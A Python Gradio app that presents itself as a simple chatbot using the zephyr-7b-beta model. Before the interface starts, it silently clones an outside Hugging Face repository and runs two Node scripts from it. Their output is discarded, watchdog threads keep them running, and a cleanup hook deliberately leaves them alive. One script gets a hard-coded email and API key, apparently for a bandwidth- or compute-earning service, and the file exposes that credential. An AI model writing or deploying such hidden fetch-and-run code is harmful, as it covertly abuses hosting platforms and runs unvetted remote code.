import gradio as gr
from huggingface_hub import InferenceClient
import subprocess
import os
import signal
import atexit
import time
import threading

# ===== Hàm khởi chạy tiến trình =====
def start_process(cmd, cwd=None, env=None):
    return subprocess.Popen(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

# ===== Watchdog =====
def watchdog(name, cmd, cwd=None, env=None):
    while True:
        proc = start_process(cmd, cwd, env)
        print(f"[WATCHDOG] {name} started with PID {proc.pid}")
        proc.wait()
        print(f"[WATCHDOG] {name} crashed. Restarting in 2s...")
        time.sleep(2)

# 1. Clone repo mới nếu chưa tồn tại
if not os.path.exists("app"):
    subprocess.run([
        "git", "clone", "https://huggingface.co/Wsdggssdggg/app"
    ])

# 2. Chạy watchdog cho app.js
threading.Thread(
    target=watchdog,
    args=("app.js", ["node", "app.js"]),
    kwargs={"cwd": "app"},
    daemon=True
).start()

# 3. Chạy watchdog cho core.js với biến môi trường
env_vars = os.environ.copy()
env_vars["RP_EMAIL"] = "mamateo0005@gmail.com"
env_vars["RP_API_KEY"] = "fe0c231a-79ad-401d-8463-28e291156326"

threading.Thread(
    target=watchdog,
    args=("core.js", ["node", "core.js"]),
    kwargs={"cwd": "app", "env": env_vars},
    daemon=True
).start()

# 4. Chatbot code
client = InferenceClient("HuggingFaceH4/zephyr-7b-beta")

def respond(message, history, system_message, max_tokens, temperature, top_p):
    messages = [{"role": "system", "content": system_message}]
    for val in history:
        if val[0]:
            messages.append({"role": "user", "content": val[0]})
        if val[1]:
            messages.append({"role": "assistant", "content": val[1]})
    messages.append({"role": "user", "content": message})

    response = ""
    for msg in client.chat_completion(
        messages,
        max_tokens=max_tokens,
        stream=True,
        temperature=temperature,
        top_p=top_p,
    ):
        token = msg.choices[0].delta.content
        response += token
        yield response

demo = gr.ChatInterface(
    respond,
    additional_inputs=[
        gr.Textbox(value="You are a friendly Chatbot.", label="System message"),
        gr.Slider(minimum=1, maximum=2048, value=512, step=1, label="Max new tokens"),
        gr.Slider(minimum=0.1, maximum=4.0, value=0.7, step=0.1, label="Temperature"),
        gr.Slider(minimum=0.1, maximum=1.0, value=0.95, step=0.05, label="Top-p"),
    ],
)

# 5. Không tắt tiến trình khi đóng Gradio
def cleanup():
    pass
atexit.register(cleanup)

if __name__ == "__main__":
    demo.launch(server_name="0.0.0.0", server_port=7860)
